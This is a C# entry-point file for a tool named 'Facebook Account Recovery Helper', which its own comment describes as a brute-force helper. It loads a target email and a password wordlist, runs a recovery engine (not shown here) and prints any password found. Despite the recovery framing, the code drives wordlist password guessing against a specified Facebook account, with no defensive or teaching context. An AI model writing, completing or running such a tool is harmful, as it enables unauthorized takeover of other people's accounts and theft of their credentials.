using System;
using System.Threading.Tasks;

namespace FacebookAccountRecoveryHelper
{
    /// <summary>
    /// Entry point for the Facebook account recovery brute-force helper.
    /// Orchestrates loading configuration, performing recovery attempts, and reporting results.
    /// </summary>
    class Program
    {
        static async Task Main(string[] args)
        {
            Console.WriteLine("Facebook Account Recovery Helper v1.0");
            Console.WriteLine("=====================================");

            // Load configuration from file or defaults
            var config = ConfigLoader.LoadConfig("config.json");
            if (config == null)
            {
                Console.WriteLine("Failed to load configuration. Exiting.");
                return;
            }

            Console.WriteLine($"Target email: {config.TargetEmail}");
            Console.WriteLine($"Wordlist path: {config.WordlistPath}");

            // Initialize the recovery engine
            var engine = new RecoveryEngine(config);
            var result = await engine.RunAsync();

            if (result.Success)
            {
                Console.WriteLine($"Recovery successful! Password found: {result.FoundPassword}");
            }
            else
            {
                Console.WriteLine($"Recovery failed after {result.AttemptsMade} attempts.");
            }
        }
    }
}
